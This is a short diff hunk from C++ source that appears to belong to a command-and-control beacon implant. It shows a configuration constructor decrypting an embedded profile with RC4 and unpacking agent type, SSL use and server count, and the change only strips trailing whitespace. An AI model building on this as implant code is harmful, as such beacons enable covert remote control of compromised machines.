@@ -19,9 +19,9 @@ AgentConfig::AgentConfig()
 	memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);
 
 	DecryptRC4(packer->data()+4, profileSize, this->encrypt_key, 16);
-	
+
 	this->agent_type = packer->Unpack32();
-	
+
 #if defined(BEACON_HTTP)
 	this->profile.use_ssl       = packer->Unpack8();
 	this->profile.servers_count = packer->Unpack32();
